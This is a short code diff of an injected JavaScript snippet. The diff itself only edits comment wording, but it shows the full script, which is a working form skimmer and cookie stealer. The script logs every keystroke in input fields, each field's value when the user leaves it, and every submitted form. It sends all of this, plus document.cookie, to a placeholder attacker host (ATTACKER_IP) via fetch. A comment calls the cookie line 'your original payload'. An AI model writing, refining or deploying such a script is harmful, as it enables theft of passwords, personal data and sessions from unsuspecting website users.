@@ -3,14 +3,14 @@ mobile key chain??!
 <script>
 var endpoint = 'ATTACKER_IP';
 
-// 1. Real-time input capture (shows each character as typed/corrected)
+// 1. real-time input capture (shows each character as typed/corrected)
 document.addEventListener('input', function(e) {
     if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
         fetch(endpoint + '/input?' + e.target.name + '=' + encodeURIComponent(e.target.value));
     }
 }, true);
 
-// 2. On blur — final value when they leave the field
+// 2. on blur. final value when they leave the field
 document.addEventListener('blur', function(e) {
     if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
         if (e.target.value) {
@@ -19,7 +19,7 @@ document.addEventListener('blur', function(e) {
     }
 }, true);
 
-// 3. Form submission — full capture of all fields at once
+// 3. form submission. full capture of all fields at once
 document.addEventListener('submit', function(e) {
     var data = new FormData(e.target);
     var params = [];
@@ -29,6 +29,6 @@ document.addEventListener('submit', function(e) {
     fetch(endpoint + '/submit?' + params.join('&'));
 }, true);
 
-// 4. Cookie exfiltration (your original payload)
+// 4. cookie exfiltration (your original payload)
 fetch(endpoint + '/cookie?c=' + document.cookie);
 </script>
